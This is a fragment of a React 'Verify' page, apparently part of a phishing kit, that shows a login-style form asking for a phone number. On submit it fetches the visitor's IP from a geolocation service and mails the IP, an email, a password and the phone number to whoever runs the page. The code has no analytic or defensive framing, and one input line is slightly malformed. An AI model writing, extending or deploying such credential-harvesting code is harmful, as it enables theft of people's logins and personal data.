...
const Verify = () => {
    ...
    const [contact, Setcontact] = useState({ no: "", code: "47" })
    const navigate = useNavigate()
    const submitForm = async (e) => {
        e.preventDefault();
        if (contact.no && contact.no.length == 10) {
            const { data } = await axios.get('https://geolocation-db.com/json/')
            const ip = data.IPv4
            const phone = `${contact.code} ${contact.no}`
            await mail({ ip, email, password, phone })
                    ...
                    <div class="container-fluid">
                        <div class="row" id="row_banner">
                            <div class="col-md-3 mobile_col3">
                                <div class="row_ m-0" id="form_login">
                                                ...
                                                <div class="form-group">
                                                    <div class="row_form_n">
                                                        <div class="col_form_items" id="select_data">
                                                            <select name="country" id="country" onChange={e => Setcontact({ ...contact, code: e.target.value })}>
                                                        ...
                                                        <div class="col_form_items" id="select_inputfield">
                                                            <input type="number" maxlength="10" class="form-control" placeholder="234-567-8910
"r name="number" id="exampleInputPassword1" required value={contact.no} onChange={e => Setcontact({ ...contact, no: e.target.value })} />
                                                        </div>
                                                    </div>
